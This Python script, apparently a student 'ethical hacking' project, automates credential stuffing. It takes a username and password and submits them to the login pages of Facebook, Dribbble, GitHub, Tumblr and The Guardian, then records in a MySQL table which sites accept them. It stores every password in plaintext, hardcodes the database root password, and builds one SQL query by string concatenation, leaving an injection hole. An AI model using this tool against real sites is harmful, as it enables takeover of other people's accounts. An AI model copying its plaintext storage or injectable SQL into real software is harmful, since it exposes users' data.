#!/usr/bin/env python
"""
Jae Lee & Cameron Moeller & Morio Ramdenbourg
sample input line

Usage:
    python try.py <usename> <password> <site1> <site2> <site3> <site4> ...
"""

from enum import Enum
import sys
import mechanize
import json
import pymysql.cursors
import pymysql

# Connect to the database
connection = pymysql.connect(host='localhost',
                             user='root',
                             password='ethicalhacking',
                             db='ethicalhackingteam2',
                             charset='utf8mb4',
                             cursorclass=pymysql.cursors.DictCursor)


# enum for the sites
class Site(str, Enum):
    Facebook = "facebook"
    Dribbble = "dribbble"
    Github = "github"
    Tumblr = "tumblr"
    TheGuardian = "theguardian"

# Dictionary of sites that we can attempt to authenticate
urls = {
    Site.Facebook: {
        "attempt": "http://www.facebook.com/login.php",
        "correct": "https://www.facebook.com/checkpoint/?next",
	"correct": "https://www.facebook.com/?sk=welcome"
    },
    Site.Dribbble: {
	"attempt": "https://dribbble.com/session/new",
	"correct": "https://dribbble.com/"	
    },
    Site.Github: {
	"attempt": "https://github.com/login",
        "correct": "https://github.com/"
    },
    Site.Tumblr: {
        "attempt": "https://www.tumblr.com/login",
        "correct": "https://www.tumblr.com/dashboard"
    },
    Site.TheGuardian: {
        "attempt": "https://profile.theguardian.com/signin?INTCMP=DOTCOM_HEADER_SIGNIN",
        "correct": "https://www.theguardian.com/us"
    }
}

# Browser settings
browser = mechanize.Browser()
browser.set_handle_robots(False)
cookies = mechanize.CookieJar()
browser.set_cookiejar(cookies)
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
browser.set_handle_refresh(False)


def main():

    # fb #need to use nr = 0 (email, pass)
    # zipcar #need to use nr = 0 (user_name, password)
    # ebay #need to use nr = 0 (userid, pass)
    # tumblr #need to use nr = 0 (user[email], user[password])
    # netflix #need to use nr = 0 (email, password)

    if len(sys.argv) >= 4:
        # Grab command line arguments, exit if it is invalid
        username = sys.argv[1]
        password = sys.argv[2]

                    
        # Update MySql database
        with connection.cursor() as cursor:
            # Create a new record
            print("<p>Adding entry</p>")
            sql = "INSERT INTO `ethicalhackingteam2` (`username`, `password`) VALUES (%s, %s)"
            cursor.execute(sql, (username, password))

        # connection is not autocommit by default. So you must commit to save
        # your changes.
        connection.commit()

        # Authenticate to each site
        for site in sys.argv[3:]:
            print("<p><u>Attempt: <strong>" + site + "</strong></u></p>")
            
            # Attempt authentication
            attempt_authentication(site=site, username=username, password=password)

    else:
        # Exit program; invalid arguments
        print("Usage: python Authenticate.py <username> <password> <site1> <site2> <site3>")

    connection.close()


def attempt_authentication(site, username, password):
    try:
        # grab fields
        attempt = urls[site]["attempt"]
        correct = urls[site]["correct"]
        browser.open(attempt)
        browser.select_form(nr=0)

        # try the credentials on different sites
        if site == Site.Facebook:
            browser.form['email'] = username
            browser.form['pass'] = password
        if site == Site.Dribbble:
            browser.form['login'] = username
            browser.form['password'] = password
        if site == Site.Github:
            browser.form['login'] = username
            browser.form['password'] = password
        if site == Site.Tumblr:
            browser.form['user[email]'] = username
            browser.form['user[password]'] = password
        if site == Site.TheGuardian:
            browser.form['email'] = username
            browser.form['password'] = password

        # Submit the request and get the response
        response = browser.submit()
        response_url = response.geturl()

        print(response_url)

        # Check if the authentication was successful
        success = response_url == correct

        if success:
            print("<p style=color:green;>Success</p>")
            print("<p>Updating database...</p>")

            # Update MySql database
            with connection.cursor() as cursor:
                sql = "UPDATE ethicalhackingteam2 SET sites_breached_%s" % site
                sql = sql + "=1"
                sql = sql + " WHERE username='" + username + "'"
                cursor.execute(sql)
                print("<p>Updated</p>")

            # # connection is not autocommit by default. So you must commit to save
            # # your changes.
            connection.commit()
            
        else:
            print("<p style=color:red;>Failed</p>")       

    except Exception as e: # Catch exception and return false
        print("An error occured:", e)

if __name__ == '__main__':
    main()
